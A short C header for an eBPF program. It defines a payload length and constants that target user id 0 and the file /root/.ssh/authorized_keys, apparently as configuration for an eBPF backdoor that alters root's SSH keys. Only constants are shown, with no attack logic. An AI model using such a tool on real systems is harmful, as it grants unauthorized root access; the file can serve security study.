#ifndef __COMMON__
#define __COMMON__

#include "vmlinux.h"
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_helpers.h>

// DEBUG MODE
//#define DEBUG

#ifndef MAX_PAYLOAD_LEN
#define MAX_PAYLOAD_LEN 580
#endif

#ifndef TASK_COMM_LEN
#define TASK_COMM_LEN 16
#endif

// The UserID of the user, if we're restricting
// running to just this user
// uid=0 root /root/.ssh/authorized_keys
const volatile int uid = 0;
const volatile int target_file_len = 27;
const volatile char target_file[27] = "/root/.ssh/authorized_keys";

#endif
